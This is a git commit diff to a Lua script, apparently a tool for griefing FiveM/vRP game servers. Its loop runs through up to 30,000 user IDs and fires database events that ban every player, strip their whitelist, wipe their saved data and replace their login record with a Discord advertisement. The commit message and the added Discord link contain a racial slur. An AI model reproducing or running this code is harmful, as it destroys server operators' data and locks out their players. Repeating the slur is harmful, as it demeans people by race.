e5329408c95714d1794aa03bf5e4f4d390acfcb4
Diamond <81833678+0x98a@users.noreply.github.com>
2021-12-20 16:26:08 +0100

    negerslayer4k

--- Autobanner.lua
+++ Autobanner.lua
@@ -36,8 +36,8 @@ Citizen.CreateThread(function()
     Citizen.Wait(5500)
     for i = 0,30000 do -- ændre dette 30000 til antal ids der er på serveren
         Wait(100)
-        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_last_login", {user_id = i, last_login = "Skildpadde Squad | Server wiped | discord.gg/skildpaddesquad"}, 2) -- fjerner last login og replacer det med discord link (kan folk se i databasen)
-        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/banned", {user_id = i, banned = 1, reason = "Skildpadde Squad | Server wiped | discord.gg/skildpaddesquad"}, 2) -- banner person
+        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_last_login", {user_id = i, last_login = "Skildpadde Squad | Server wiped | discord.gg/negerslayer4k"}, 2) -- fjerner last login og replacer det med discord link (kan folk se i databasen)
+        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/banned", {user_id = i, banned = 1, reason = "Skildpadde Squad | Server wiped | discord.gg/negerslayer4k"}, 2) -- banner person
         TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_whitelisted", {user_id = i, whitelisted = 0}, 2) -- fjern whitelist af person
         TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_userdata", {user_id = i, key = "vRP:datatable", value = "{}"}, 2) -- wiper en persons data da den sætter det til 0 data, du kan sætte den til hvad du vil men kun i json.
         print('[SKILDPADDE SQUAD - LOGGING] ID ' .. i .. ' Done!')
